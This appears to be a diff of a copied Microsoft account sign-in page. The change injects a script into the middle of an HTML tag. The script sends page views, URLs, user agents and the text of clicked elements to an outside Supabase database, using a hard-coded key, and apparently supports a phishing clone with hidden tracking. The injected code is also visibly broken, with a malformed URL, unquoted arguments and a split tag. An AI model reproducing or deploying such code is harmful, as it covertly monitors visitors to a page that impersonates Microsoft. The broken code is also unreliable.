@@ -1,4 +1,28 @@
-<!-- Copyright (C) Microsoft Corporation. All rights reserved. --><!DOCTYPE html><!-- ServerInfo: BL02EPF0001D80E 16.0.30529.1 LocVer:0 --><!-- PreprocessInfo: CBA-0211_232210:663a337bc000004, 2025-02-11T23:40:40.6957297-08:00 - Version: 16,0,30529,1 --><!-- RequestLCID: 1033, Market:EN-US, PrefCountry: US, LangLCID: 1033, LangISO: EN --><html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=Edge"/><link rel="preconnect" href="https://acctcdn.msauth.net" crossorigin>
+<!-- Copyright (C) Microsoft Corporation. All rights reserved. --><!DOCTYPE html><!-- ServerInfo: BL02EPF0001D80E 16.0.30529.1 LocVer:0 --><!-- PreprocessInfo: CBA-0211_232210:663a337bc000004, 2025-02-11T23:40:40.6957297-08:00 - Version: 16,0,30529,1 --><!-- RequestLCID: 1033, Market:EN-US, PrefCountry: US, LangLCID: 1033, LangISO: EN --><html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=Edge"/><link <script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+
+  const SUPABASE_URL = "https://https://zatalafwwduwzpddtfje.supabase.co";
+  const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdGFsYWZ3d2R1d3pwZGR0ZmplIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDE0MTk4MjYsImV4cCI6MjA1Njk5NTgyNn0.bL-BZMgyN1oC84PCowMsVcQ8kyJhsLLVfKr6jmGqKxU";
+  const supabase = createClient(zatalafwwduwzpddtfje.supabase.co, eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdGFsYWZ3d2R1d3pwZGR0ZmplIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDE0MTk4MjYsImV4cCI6MjA1Njk5NTgyNn0.bL-BZMgyN1oC84PCowMsVcQ8kyJhsLLVfKr6jmGqKxU);
+
+  async function logEvent(eventName) {
+    const { error } = await supabase.from('logs').insert([
+      {
+        event: eventName,
+        page_url: window.location.href,
+        user_agent: navigator.userAgent,
+      }
+    ]);
+    if (error) console.error("Logging failed:", error);
+  }
+
+  window.addEventListener("load", () => logEvent("page_view"));
+
+  document.addEventListener("click", (event) => {
+    const targetText = event.target.innerText || "unknown";
+    logEvent(`click: ${targetText}`);
+  });
+</script>rel="preconnect" href="https://acctcdn.msauth.net" crossorigin>
 <link rel="preconnect" href="https://acctcdn.msftauth.net" crossorigin>
 <link rel="preconnect" href="https://logincdn.msftauth.net" crossorigin>
 <meta http-equiv="x-dns-prefetch-control" content="on">
